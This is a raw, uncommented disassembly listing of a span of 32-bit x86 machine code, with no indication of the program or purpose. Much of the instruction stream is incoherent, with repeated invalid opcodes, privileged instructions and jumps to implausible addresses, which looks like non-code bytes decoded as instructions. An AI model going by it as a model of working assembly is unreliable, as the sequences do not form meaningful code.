  4149b9:	mov    eax,DWORD PTR [ebx]
  4149bb:	cmp    eax,0x3004d1c
  4149c1:	xbegin 0x66c6d5bb
  4149c7:	clc    
  4149c8:	or     BYTE PTR [ebp+0x45],al
  4149cb:	xor    BYTE PTR ds:0x78b089c,dh
  4149d1:	adc    BYTE PTR [ebp+0x45],cl
  4149d4:	lea    eax,[ebp+0x33727501]
  4149da:	add    cl,ch
  4149dc:	inc    ebp
  4149dd:	add    bl,ch
  4149df:	add    BYTE PTR [ebx+0x45850845],cl
  4149e5:	je     0x414972
  4149e7:	push   ebx
  4149e8:	or     al,0x85
  4149ea:	dec    ebp
  4149eb:	std    
  4149ec:	mov    bh,bh
  4149ee:	mov    BYTE PTR [ebp-0x75],al
  4149f1:	mov    edi,eax
  4149f3:	or     al,0x89
  4149f5:	inc    ebp
  4149f6:	clc    
  4149f7:	mov    esp,esp
  4149f9:	hlt    
  4149fa:	call   DWORD PTR [edi-0x37]
  4149fd:	push   ebp
  4149fe:	or     al,0x51
  414a00:	push   ebp
  414a01:	xor    ebp,esp
  414a03:	mov    esi,0x457251
  414a08:	xor    esi,eax
  414a0a:	pushf  
  414a0b:	inc    ebp
  414a0c:	(bad)  
  414a0d:	mov    edi,eax
  414a0f:	or     al,0x85
  414a11:	add    al,bh
  414a13:	inc    eax
  414a15:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  414a19:	or     ah,bh
  414a1b:	inc    eax
  414a1c:	push   ebp
  414a1d:	jmp    0x414a70
  414a1f:	mov    eax,DWORD PTR ds:0xe8720c
  414a25:	mov    DWORD PTR [ebp-0x8],eax
  414a28:	jne    0x414a6f
  414a2a:	jmp    0x4149b7
  414a2c:	mov    ebp,DWORD PTR [eax]
  414a2e:	clc    
  414a2f:	retf   0xff55
  414a32:	push   ecx
  414a33:	mov    DWORD PTR ds:0x757210,eax
  414a39:	mov    ecx,DWORD PTR [ebp-0x4]
  414a3c:	sub    esp,DWORD PTR [ebx-0x77]
  414a3f:	dec    DWORD PTR [eax*4-0x74ca8abb]
  414a46:	or     ah,bh
  414a48:	pop    es
  414a49:	ds pushf 
  414a4b:	push   DWORD PTR [edx]
  414a4d:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  414a53:	(bad)  
  414a54:	mov    bh,bh
  414a56:	jmp    0x414a44
  414a58:	leave  
  414a59:	jne    0x414a63
  414a5b:	call   0x2e43b5
  414a60:	in     al,dx
  414a61:	dec    ebp
  414a62:	add    dh,BYTE PTR [ebx]
  414a64:	add    BYTE PTR [ebx],al
  414a66:	inc    ebp
  414a67:	cmp    esi,DWORD PTR [ecx]
  414a69:	je     0x414a07
  414a6b:	mov    eax,edi
  414a6d:	or     al,0xf0
  414a6f:	add    BYTE PTR [ebp+0x458bf845],al
  414a75:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  414a7b:	adc    al,0x7
  414a7d:	enter  0x9fc0,0xa5
  414a81:	rol    BYTE PTR [eax],0x5e
  414a84:	mov    ecx,ecx
  414a86:	or     al,0xc
  414a88:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  414a8f:	jmp    0x414a90
  414a91:	push   ebp
  414a92:	mov    esp,ebp
  414a94:	cld    
  414a95:	inc    ebp
  414a96:	inc    ebp
  414a97:	or     DWORD PTR [ecx+0x457dec10],0x0
  414a9e:	push   esi
  414a9f:	push   esi
  414aa0:	mov    edi,0x7af080f
  414aa5:	add    bh,al
  414aa7:	test   DWORD PTR [edi+ecx*1+0x3a732],ebx
  414aae:	mov    DWORD PTR [edi],ecx
  414ab0:	adc    BYTE PTR [eax+0x45],al
  414ab3:	mov    ebp,eax
  414ab5:	mov    ebp,edi
  414ab7:	lock call edx
  414aba:	fcom   DWORD PTR [ebp+0x45]
  414abd:	mov    eax,0x148a8b
  414ac2:	push   ecx
  414ac3:	enter  0xc145,0x83
  414ac7:	cmp    ecx,DWORD PTR [eax]
  414ac9:	add    BYTE PTR [ebp+0x4d],al
  414acc:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  414ad2:	call   0xffa14641
  414ad7:	cmp    eax,DWORD PTR [ebp-0xc]
  414ada:	jmp    DWORD PTR [eax+edx*1-0x4e]
  414ade:	push   ebp
  414adf:	(bad)  
  414ae0:	call   0x3248e4
  414ae5:	mov    bh,0xdb
  414ae7:	cld    
  414ae8:	or     BYTE PTR [ebp+0x45],bl
  414aeb:	(bad)  
  414aec:	call   0xff7b477c
  414af1:	add    al,BYTE PTR [ebp+0x37]
  414af4:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  414afa:	jne    0x414afc
  414afc:	(bad)  
  414afd:	cmp    edi,esp
  414aff:	jne    0x414b32
  414b01:	mov    edi,edi
  414b03:	or     BYTE PTR [ebx-0x307f0b49],cl
  414b09:	pop    ds
  414b0a:	into   
  414b0b:	je     0x414ace
  414b0d:	mov    ebx,DWORD PTR [esi]
  414b0f:	or     BYTE PTR [ebp-0x49],al
  414b12:	mov    esp,DWORD PTR [esi-0x77]
  414b15:	mov    esi,0x4451f0c
  414b1a:	mov    eax,DWORD PTR [eax]
  414b1c:	or     al,0x66
  414b1e:	sar    bl,0x3b
  414b21:	xor    esi,DWORD PTR [ebp+0x66]
  414b24:	xor    ecx,edi
  414b26:	pop    edi
  414b27:	adc    bl,BYTE PTR [ebx+0x70]
  414b2a:	ret    0xff
  414b2d:	cld    
  414b2e:	inc    ebp
  414b2f:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  414b35:	cld    
  414b36:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  414b3d:	push   0xffffff83
  414b3f:	pop    edi
  414b40:	or     BYTE PTR [ebp+0x53],dh
  414b43:	xorps  xmm1,xmm2
  414b46:	test   BYTE PTR [eax+eax*1],bh
  414b49:	add    BYTE PTR [eax],al
  414b4b:	adc    eax,eax
  414b4d:	add    DWORD PTR [eax+esi*2-0xff7b00],0xffffffb7
  414b55:	jmp    DWORD PTR [eax]
  414b57:	ror    al,0x5e
  414b5a:	inc    ebp
  414b5b:	leave  
  414b5c:	xor    ecx,DWORD PTR [eax]
  414b5e:	and    DWORD PTR [ebx-0x3ec10708],ecx
  414b64:	add    ah,al
  414b66:	xor    edi,edi
  414b68:	xor    DWORD PTR [ebx],0x66003304
  414b6e:	mov    DWORD PTR [ebp-0xc],ecx
  414b71:	pcmpgtw mm0,mm0
  414b74:	add    dl,ah
  414b76:	leave  
  414b77:	mov    edi,DWORD PTR [esi-0x7d]
  414b7a:	push   ax
  414b7c:	dec    ebp
  414b7d:	mov    esi,DWORD PTR [ebx-0x75]
  414b80:	lea    ebp,[eax-0x7c00ff04]
  414b86:	xor    eax,DWORD PTR [eax]
  414b88:	sysret 
  414b8a:	dec    ebp
  414b8b:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  414b92:	push   WORD PTR [ecx+0x8]
  414b96:	jne    0x414b59
  414b98:	ud0    ecx,DWORD PTR [ecx]
  414b9b:	mov    eax,edx
  414b9d:	lods   al,BYTE PTR ds:[esi]
  414b9e:	add    BYTE PTR [eax],al
  414ba0:	data16 (bad) 
  414ba2:	iret   
  414ba3:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  414baa:	cli    
  414bab:	inc    ebp
  414bac:	cmp    al,0x8d
  414bae:	add    BYTE PTR [esi+0x2d],ah
  414bb1:	inc    ebp
  414bb2:	pop    ebp
  414bb3:	lea    ecx,[edi]
  414bb5:	mov    dl,bh
  414bb7:	add    BYTE PTR [edi],cl
  414bb9:	mov    DWORD PTR [eax+eax*8],edi
  414bbc:	mov    ebx,0x3b87
  414bc1:	add    BYTE PTR [ebx],ch
  414bc3:	inc    ebp
  414bc4:	data16 (bad) 
  414bc6:	clc    
  414bc7:	int3   
  414bc8:	cmp    eax,DWORD PTR [eax]
  414bca:	je     0x414b55
  414bcc:	push   0xffffffc8
  414bce:	pop    edi
  414bcf:	xchg   DWORD PTR [ebp+0x0],eax
  414bd2:	data16 add BYTE PTR [ebp+0x45],cl
  414bd6:	lea    cx,[ebp+0x10]
  414bda:	jb     0x414bdc
  414bdc:	jmp    0x414b67
  414bde:	call   eax
  414be0:	clc    
  414be1:	xchg   DWORD PTR [edi+0x1],edi
  414be4:	mov    eax,DWORD PTR [eax]
  414be6:	or     BYTE PTR [ebp-0x49],al
  414be9:	lea    eax,[eax+0x74003154]
  414bef:	push   edi
  414bf0:	inc    edx
  414bf1:	jge    0x414bf2
  414bf3:	mov    DWORD PTR [edi],ecx
  414bf5:	fdiv   DWORD PTR [edi-0x6]
  414bf8:	inc    DWORD PTR [eax]
  414bfa:	xor    edx,DWORD PTR [eax+0x5f]
  414bfd:	xchg   DWORD PTR [ebx+0x1],ebx
  414c00:	ret    0x0
  414c03:	xor    BYTE PTR [ebp-0x51],cl
  414c06:	cmp    edi,0xf0ff89fc
  414c0c:	data16 ror al,0x84
  414c10:	rol    BYTE PTR [eax],0x3b
  414c13:	add    al,dh
  414c15:	dec    eax
  414c16:	xchg   esp,eax
  414c17:	push   ebx
  414c18:	jmp    0x414ba5
  414c1a:	push   ebp
  414c1b:	add    esp,ebp
  414c1d:	add    ebp,esp
  414c1f:	mov    edx,DWORD PTR [edi+0x24]
  414c22:	clc    
  414c23:	dec    esi
  414c24:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  414c2a:	cmp    BYTE PTR [ebx],al
  414c2c:	jne    0x414bb7
  414c2e:	xor    esp,eax
  414c30:	jmp    0x444db3
  414c35:	add    ebp,DWORD PTR [ecx+ecx*4]
  414c38:	jne    0x414c2e
  414c3a:	call   0xffcb4994
  414c3f:	clc    
  414c40:	xchg   edi,eax
  414c41:	sti    
  414c42:	add    DWORD PTR [ebx],eax
  414c44:	add    BYTE PTR [ebp+0x47],bl
  414c47:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  414c4d:	pop    ebp
  414c4e:	mov    DWORD PTR [esi-0x48],esi
  414c51:	jmp    0x414c9a
  414c53:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  414c59:	(bad)  
  414c5b:	cmp    al,0x0
  414c5d:	cmp    eax,DWORD PTR [ebp+0x18]
  414c60:	lea    ebx,[ebp-0x56]
  414c63:	jle    0x414c65
  414c65:	jae    0x414bf0
  414c67:	mov    eax,esp
  414c69:	call   0xb900:0x8b005587
  414c70:	inc    ebp
  414c71:	push   ebp
  414c72:	lea    ecx,[ebp-0x27ff4f12]
  414c78:	mov    eax,edi
  414c7a:	int3   
  414c7b:	push   ebp
  414c7c:	xchg   edi,eax
  414c7e:	add    esp,ebp
  414c80:	add    BYTE PTR [eax],al
  414c82:	inc    ebp
  414c83:	add    BYTE PTR [ebp+0x8b3255],cl
  414c89:	cld    
  414c8a:	mov    DWORD PTR [edx],edi
  414c8c:	aam    0x75
  414c8e:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  414c94:	mov    DWORD PTR [ebx-0x50],edx
  414c97:	test   BYTE PTR [ebp-0x1],0xe8
  414c9b:	mov    eax,DWORD PTR [eax]
  414c9d:	hlt    
  414c9e:	add    al,al
  414ca0:	mov    eax,DWORD PTR ds:0x890045a8
  414ca6:	dec    DWORD PTR [ebx+0x45fdf0e8]
  414cac:	inc    DWORD PTR [eax*2+0xf75854d]
  414cb3:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  414cb9:	call   0x7297a9fa
  414cbe:	je     0x414d1e
  414cc0:	js     0x414d21
  414cc2:	lock ret 0x7e
  414cc6:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  414ccc:	mov    edi,edi
  414cce:	sbb    al,bl
  414cd0:	clc    
  414cd1:	add    BYTE PTR [ebp-0x73],bh
  414cd4:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  414cda:	ror    BYTE PTR [eax],1
  414cdc:	dec    ebp
  414cdd:	xchg   ebp,eax
  414cde:	mov    edi,edi
  414ce0:	in     al,0x8b
  414ce2:	jge    0x414c6d
  414ce4:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  414cea:	clc    
  414ceb:	pop    esi
  414cec:	fist   DWORD PTR [ebp+0x5d398b5d]
  414cf2:	clc    
  414cf3:	add    al,0x6e
  414cf5:	mov    eax,DWORD PTR [ebx]
  414cf7:	mov    BYTE PTR [ebp+0x0],dl
  414cfa:	mov    edx,DWORD PTR [ebx-0x20]
  414cfd:	adc    esi,DWORD PTR [edi+0x5e005f3e]
  414d03:	add    eax,0x3b3b73
  414d08:	adc    al,0x89
  414d0a:	pop    eax
  414d0b:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  414d0f:	ret    0xf08
  414d12:	cmp    al,0x2
  414d14:	mov    edx,eax
  414d16:	cld    
  414d17:	add    BYTE PTR [ebp+0x66],dl
  414d1a:	add    eax,ebx
  414d1c:	add    esp,eax
  414d1e:	sub    eax,eax
  414d20:	or     BYTE PTR [ecx-0x77f474bb],cl
  414d26:	add    BYTE PTR [eax],al
  414d28:	mov    DWORD PTR [ebx-0x24],ebx
  414d2b:	push   edi
  414d2c:	push   ebp
  414d2d:	clc    
  414d2e:	add    DWORD PTR [esi+0x1b0100],0x45
  414d35:	out    0xff,eax
  414d37:	add    edx,DWORD PTR [eax]
  414d39:	jmp    0x414d23
  414d3b:	cmp    ch,0x47
  414d3e:	(bad)  
  414d3f:	jmp    0x40c6d591
  414d44:	je     0x414cd0
  414d46:	mov    eax,DWORD PTR [eax-0x10c78f04]
  414d4c:	inc    ebp
  414d4d:	add    BYTE PTR [ebx-0x770375],al
  414d53:	add    ah,ch
  414d55:	add    edx,esp
  414d57:	pop    edi
  414d58:	pop    ebp
  414d59:	push   ebp
  414d5a:	inc    ebx
  414d5b:	in     al,dx
  414d5c:	pop    ebp
  414d5d:	in     al,dx
  414d5e:	cmp    edx,DWORD PTR [edi-0x8]
  414d61:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  414d68:	add    al,0x47
  414d6a:	push   ebp
  414d6b:	mov    esp,ebp
  414d6d:	in     al,0x45
  414d6f:	dec    ebp
  414d70:	push   esi
  414d71:	test   DWORD PTR [eax+0xfb010f],esi
  414d77:	add    BYTE PTR [eax+0xc018b],dh
  414d7d:	leave  
  414d7e:	inc    ebp
  414d7f:	test   al,ch
  414d81:	add    dh,bh
  414d83:	add    bh,bh
  414d85:	dec    ebp
  414d86:	push   cs
  414d87:	mov    DWORD PTR [ecx],eax
  414d89:	hlt    
  414d8a:	push   es
  414d8b:	dec    ebp
  414d8c:	leave  
  414d8d:	mov    DWORD PTR [eax],ecx
  414d8f:	clc    
  414d90:	cmovge eax,ecx
  414d93:	mov    ecx,0x85c2f0
  414d99:	clc    
  414d9a:	pop    DWORD PTR [ebp+0x1]
  414d9d:	push   ebx
  414d9e:	add    BYTE PTR [ebp-0x15],bh
  414da1:	push   esi
  414da2:	xor    eax,0x898a45
  414da7:	cld    
  414da8:	add    al,0x45
  414daa:	add    BYTE PTR [ebx],dh
  414dac:	pushfw 
  414dae:	add    DWORD PTR [esi+0x78308c1],edi
  414db4:	add    ah,BYTE PTR [edi+esi*4-0x33]
  414db8:	mov    ebx,0xc4e8b
  414dbd:	(bad)  
  414dbe:	cmp    ecx,ebx
  414dc0:	jne    0x414d8a
  414dc2:	xor    ecx,DWORD PTR [ebp+0x66]
  414dc5:	jmp    0xc84dcb
  414dca:	add    DWORD PTR [ebp+0x0],eax
  414dcd:	mov    eax,ebx
  414dcf:	or     al,0x8b
  414dd1:	(bad)  
  414dd2:	mov    ecx,esi
  414dd4:	mov    BYTE PTR [eax+eax*1+0x664c138],cl
  414ddb:	mov    eax,edi
  414ddd:	or     BYTE PTR [edx],cl
  414ddf:	shl    cl,cl
  414de1:	icebp  
  414de2:	add    BYTE PTR [ebp+0x37],0x8b
  414de6:	or     BYTE PTR [edx+eax*2],cl
  414de9:	(bad)  
  414dea:	or     cl,dh
  414dec:	stc    
  414ded:	shl    DWORD PTR [ebp-0x30],0xc6
  414df1:	xor    al,0x0
  414df3:	inc    ebp
  414df4:	xchg   BYTE PTR [ebx],al
  414df6:	add    esp,edi
  414df8:	add    BYTE PTR [ebp-0x39],cl
  414dfb:	mov    al,bl
  414dfd:	test   DWORD PTR [ebx+0x1c348375],ecx
  414e03:	sub    al,0xbf
  414e05:	jmp    0x414d8c
  414e07:	mov    edi,eax
  414e09:	lock jge 0x414dfd
  414e0c:	lea    esi,[edx-0x74bad501]
  414e12:	mov    ebp,esp
  414e14:	or     cl,dh
  414e16:	leave  
  414e17:	add    al,BYTE PTR [eax+eax*4-0x37ff9c00]
  414e1e:	dec    ebp
  414e1f:	dec    ebp
  414e20:	test   DWORD PTR [ebx],eax
  414e22:	paddb  mm6,mm0
  414e25:	add    DWORD PTR [eax],eax
  414e27:	dec    ebp
  414e28:	mov    ecx,DWORD PTR [ebx-0x63b217f0]
  414e2e:	mov    esi,DWORD PTR [edx]
  414e30:	or     al,0x2b
  414e32:	dec    ebp
  414e33:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  414e39:	mov    esp,esi
  414e3b:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  414e42:	mov    DWORD PTR [ebx],ebp
  414e44:	call   0xc74d774
  414e49:	mov    DWORD PTR [ebp+0x10],ecx
  414e4c:	(bad)  
  414e4d:	push   0x8b85ff10
  414e52:	clc    
  414e53:	or     al,0x55
  414e55:	(bad)  
  414e56:	push   ecx
  414e57:	retf   
  414e58:	mov    ebx,0xff4d8dc8
  414e5d:	mov    DWORD PTR [ebp+0x8],eax
  414e60:	xor    eax,DWORD PTR [ebp-0x75]
  414e63:	cmp    ebp,DWORD PTR [ebx]
  414e65:	lsl    ebx,WORD PTR [edi-0x8]
  414e69:	call   DWORD PTR [ebx-0x741bff75]
  414e6f:	(bad)  
  414e70:	or     al,0x5b
  414e72:	dec    ebp
  414e73:	or     BYTE PTR [ebx],dh
  414e75:	inc    ebp
  414e76:	xor    esi,DWORD PTR ds:0x708088d
  414e7c:	in     eax,0x9c
  414e7e:	add    BYTE PTR [edx],dh
  414e80:	inc    ebp
  414e81:	pop    edi
  414e82:	xor    eax,edx
  414e84:	test   DWORD PTR [eax],0x83108b8b
  414e8a:	dec    ebp
  414e8b:	adc    al,0x33
  414e8d:	inc    ebp
  414e8e:	xor    esi,DWORD PTR [ecx]
  414e90:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  414e97:	test   DWORD PTR [eax],ecx
  414e99:	clc    
  414e9a:	inc    ebp
  414e9b:	add    ecx,DWORD PTR [ebx+0xc7f445]
  414ea1:	hlt    
  414ea2:	leave  
  414ea3:	test   DWORD PTR [esi],eax
  414ea5:	clc    
  414ea6:	inc    edi
  414ea7:	push   edi
  414ea8:	aaa    
  414ea9:	inc    ebp
  414eaa:	pop    ss
  414eab:	ror    DWORD PTR [ebp-0x29],1
  414eae:	or     BYTE PTR [ebx+0x4d64fc55],0xd1
  414eb5:	mov    eax,0x780084d
  414eba:	push   ebp
  414ebb:	clc    
  414ebc:	ret    0xe99c
  414ebf:	xor    dl,dl
  414ec1:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  414ec7:	js     0x887dac6
  414ecd:	dec    ebp
  414ece:	push   ebp
  414ecf:	mov    edi,DWORD PTR [eax+0xc872fc]
  414ed5:	lock enter 0xceca,0xf2
  414eda:	retf   0x18ce
  414edd:	jne    0x414f2c
  414edf:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  414ee5:	enter  0xf0d6,0xca
  414ee9:	retf   0xf2c8
  414eec:	into   
  414eed:	out    dx,al
  414eee:	dec    ebp
  414eef:	dec    ebp
  414ef0:	jmp    0xff454e28
  414ef5:	xor    eax,DWORD PTR [ebp-0x15]
  414ef8:	xor    esi,DWORD PTR [ebx]
  414efa:	mov    esi,DWORD PTR [ebx]
  414efc:	sub    eax,DWORD PTR [ebx]
  414efe:	add    eax,DWORD PTR [ebx]
  414f00:	or     bl,dl
  414f02:	dec    ebp
  414f03:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  414f09:	xor    eax,DWORD PTR [ebp-0xf00073]
  414f0f:	jb     0x414f56
  414f11:	add    BYTE PTR [ebx],dh
  414f13:	dec    ebp
  414f14:	pop    esi
  414f15:	mov    ebp,ebx
  414f17:	cld    
  414f18:	mov    esi,eax
  414f1a:	call   0x520fa4e7
  414f1f:	stc    
  414f20:	add    eax,0x4572aa
  414f25:	pop    edi
  414f26:	leave  
  414f27:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  414f2e:	in     al,dx
  414f2f:	mov    eax,edi
  414f31:	xor    eax,0xf8008520
  414f37:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  414f3e:	mov    eax,DWORD PTR [ebp-0x77]
  414f41:	xor    al,bh
  414f43:	pushf  
  414f44:	inc    ebp
  414f45:	(bad)  
  414f46:	cmp    eax,ebp
  414f48:	pushf  
  414f49:	xchg   BYTE PTR [esi-0x8],dl
  414f4c:	mov    edi,0x8518e4ec
  414f52:	jmp    0xf056:0x8b457df8
  414f59:	push   ebp
  414f5a:	push   ebp
  414f5b:	push   ecx
  414f5c:	push   ecx
  414f5d:	push   edi
  414f5e:	xor    eax,esi
  414f60:	mov    edx,0x32729c
  414f65:	add    ecx,eax
  414f67:	mov    edx,edi
  414f69:	clc    
  414f6a:	retf   0xaf45
  414f6d:	cmp    ebx,ebp
  414f6f:	pushf  
  414f70:	mov    eax,edi
  414f72:	clc    
  414f73:	cld    
  414f74:	jne    0x414f8e
  414f76:	xor    ebp,edx
  414f78:	xor    eax,DWORD PTR [ebp+0x3]
  414f7b:	or     BYTE PTR [ebx],al
  414f7d:	add    BYTE PTR [ebp-0x7747475],al
  414f83:	hlt    
  414f84:	dec    ebp
  414f85:	dec    ebp
  414f86:	je     0x414fbb
  414f88:	xor    esi,DWORD PTR [ebx]
  414f8a:	xor    eax,DWORD PTR [ebx]
  414f8c:	add    eax,DWORD PTR [ebx]
  414f8e:	add    ecx,DWORD PTR [edi]
  414f90:	rol    ecx,cl
  414f92:	mov    esi,DWORD PTR [ecx]
  414f94:	in     al,dx
  414f95:	inc    ebp
  414f96:	enter  0xca2b,0x33
  414f9a:	icebp  
  414f9b:	mov    DWORD PTR [edx],ecx
  414f9d:	clc    
  414f9e:	lock pop ebp
  414fa0:	enter  0xf2e8,0xfe
  414fa4:	retf   0xeeff
  414fa7:	inc    ebp
  414fa8:	jne    0x414f35
  414faa:	mov    edi,eax
  414fac:	cld    
  414fad:	dec    ebp
  414fae:	enter  0xbc89,0x8d
  414fb2:	pushf  
  414fb3:	sti    
  414fb4:	xor    bh,bh
  414fb6:	mov    eax,DWORD PTR [ebp-0xc]
  414fb9:	mov    esi,DWORD PTR [ebp-0x4]
  414fbc:	xor    eax,esi
  414fbe:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9c]
  414fc5:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  414fcb:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  414fd1:	(bad)  
  414fd2:	push   ebp
  414fd3:	shr    esp,0x4d
  414fd6:	in     al,dx
  414fd7:	cmp    eax,DWORD PTR [esi+esi*2]
  414fda:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  414fe0:	pushf  
  414fe1:	mov    edi,0x85c7f445
  414fe7:	call   0xf886d6e4
  414fec:	xor    ebx,ebx
  414fee:	pushf  
  414fef:	popa   
  414ff0:	push   ebx
  414ff1:	dec    ebp
  414ff2:	inc    ebp
  414ff3:	mov    esi,DWORD PTR [esi]
  414ff5:	clc    
  414ff6:	pushf  
  414ff7:	into   
  414ff8:	mov    ecx,edi
  414ffa:	in     al,dx
  414ffb:	call   0x8b4995be
  415000:	pop    es
  415001:	or     BYTE PTR [ebx],dh
  415003:	or     BYTE PTR [edi+0x8a724d],bh
  415009:	or     eax,edi
  41500b:	push   ebp
  41500c:	inc    ebp
  41500d:	cmpxchg8b (bad)
  41500e:	(bad)  
  41500f:	leave  
  415010:	loopne 0x414fdc
  415012:	test   DWORD PTR [ebp-0x8],ecx
  415015:	mov    eax,DWORD PTR [ebp-0x18]
  415018:	rcl    DWORD PTR [ebp-0x29],1
  41501b:	xor    eax,edi
  41501d:	add    esi,eax
  41501f:	and    eax,DWORD PTR [eax]
  415021:	mov    eax,DWORD PTR [eax]
  415023:	(bad)  
  415024:	leave  
  415025:	sti    
  415026:	inc    ebp
  415027:	dec    DWORD PTR [ebx-0x39cc13ab]
  41502d:	mov    esi,ecx
  41502f:	clc    
  415030:	(bad)  
  415031:	dec    ebp
  415032:	iret   
  415033:	xor    ebp,DWORD PTR [edi-0x74f71473]
  415039:	jb     0x415037
  41503b:	add    bh,al
  41503d:	inc    ebp
  41503e:	(bad)  
  41503f:	mov    eax,DWORD PTR [ebp-0xc]
  415042:	(bad)  
  415043:	xabort 0x64
  415046:	loopne 0x415015
  415048:	jmp    FWORD PTR [ebx]
  41504a:	mov    DWORD PTR [ebx],eax
  41504c:	clc    
  41504d:	lock inc ebp
  41504f:	dec    ebp
  415050:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  415056:	loopne 0x41508b
  415058:	inc    DWORD PTR [ebx]
  41505a:	mov    edi,DWORD PTR [ebx]
  41505c:	hlt    
  41505d:	jne    0x4150ac
  41505f:	mov    esi,DWORD PTR [ebx]
  415061:	in     al,0x8d
  415063:	dec    ebp
  415064:	or     BYTE PTR [ebx],dh
  415066:	jb     0x41506b
  415068:	add    BYTE PTR [edi+0x45],bl
  41506b:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  415071:	add    BYTE PTR [ebx],dh
  415073:	mov    esi,DWORD PTR [ebx]
  415075:	sub    DWORD PTR [ebx],0x6c
  415078:	mov    eax,DWORD PTR [ebp-0x4]
  41507b:	xor    eax,ecx
  41507d:	pushf  
  41507e:	mov    ecx,0x338545ba
  415083:	clc    
  415084:	add    edx,DWORD PTR [ebp-0x77]
  415087:	mov    edi,eax
  415089:	adc    al,0x45
  41508b:	inc    ebp
  41508c:	mov    ebx,DWORD PTR ss:[esp+edx*1+0x1eb808b]
  415094:	mov    eax,DWORD PTR [eax]
  415096:	loopne 0x4150e5
  415098:	inc    ebp
  415099:	mov    esi,DWORD PTR [ebx]
  41509b:	mov    eax,DWORD PTR [ebx]
  41509d:	nop
  41509e:	rol    DWORD PTR [eax],cl
  4150a0:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  4150a6:	mov    cl,BYTE PTR [ecx+0x450bf888]
  4150ac:	dec    ebp
  4150ad:	push   esi
  4150ae:	mov    edi,DWORD PTR [edi+0x7b608f8]
  4150b4:	xor    eax,edi
  4150b6:	mov    DWORD PTR [eax+ecx*1-0x74fcb2ce],ebx
  4150bd:	mov    DWORD PTR [eax],ecx
  4150bf:	in     al,dx
  4150c0:	into   
  4150c1:	inc    ebp
  4150c2:	iret   
  4150c3:	xor    ecx,edx
  4150c5:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  4150cc:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  4150d2:	dec    ebp
  4150d3:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  4150d9:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9c]
  4150e0:	mov    DWORD PTR [ecx+0x8],eax
  4150e3:	mov    eax,DWORD PTR [ebp-0x8]
  4150e6:	xor    ebx,DWORD PTR [eax]
  4150e8:	mov    ecx,0xff8b8d40
  4150ed:	clc    
  4150ee:	enter  0x4d49,0x48
  4150f2:	mov    eax,edx
  4150f4:	lock enter 0x4545,0x8b
  4150f9:	mov    esi,eax
  4150fb:	cmp    dh,al
  4150fd:	rol    edi,0x3
  415100:	enter  0x9140,0x89
  415104:	inc    ebp
  415105:	adc    al,0x8b
  415107:	inc    ebp
  415108:	clc    
  415109:	xor    eax,esi
  41510b:	add    eax,edi
  41510d:	mov    DWORD PTR [esi-0x24],ebx
  415110:	rol    DWORD PTR [ebp-0x37],0x33
  415114:	add    al,0x3
  415116:	push   ebp
  415117:	mov    esp,ebp
  415119:	fsubr  st,st(4)
  41511b:	inc    ebp
  41511c:	(bad)  
  41511d:	mov    edi,esp
  41511f:	adc    BYTE PTR [ebp+0x30c3f8c7],al
  415125:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  41512c:	inc    ebp
  41512d:	test   DWORD PTR [ecx+0x454514f8],ecx
  415133:	xor    cl,BYTE PTR [ebx+0xc7909c]
  415139:	fmul   DWORD PTR [ebx+0xf81485]
  41513f:	test   DWORD PTR [ecx+0x8b0100],ecx
  415145:	cld    
  415146:	or     edi,eax
  415148:	dec    eax
  415149:	ret    
  41514a:	push   ebx
  41514b:	inc    ebp
  41514c:	dec    ebp
  41514d:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  415153:	mov    DWORD PTR [ebp-0x14],edx
  415156:	push   ecx
  415157:	jne    0x41518c
  415159:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41515f:	call   0xff874327
  415164:	mov    eax,DWORD PTR [ebp-0x4]
  415167:	mov    edi,0x4585c3d8
  41516d:	clc    
  41516e:	mov    eax,DWORD PTR [ebp-0x8]
  415171:	xor    eax,DWORD PTR [eax+0x3]
  415174:	adc    DWORD PTR [eax+0xc],0x45
  415178:	inc    ebp
  415179:	push   eax
  41517a:	mov    ebx,ebp
  41517c:	clc    
  41517d:	inc    DWORD PTR [eax-0x75]
  415180:	mov    esi,eax
  415182:	clc    
  415183:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41518a:	je     0x41518f
  41518c:	mov    edx,DWORD PTR [eax+0x38]
  41518f:	jne    0x4151de
  415191:	lea    ecx,[ebx-0x817ab44]
  415197:	mul    BYTE PTR [ebx]
  415199:	dec    DWORD PTR [ebx+0x4089f845]
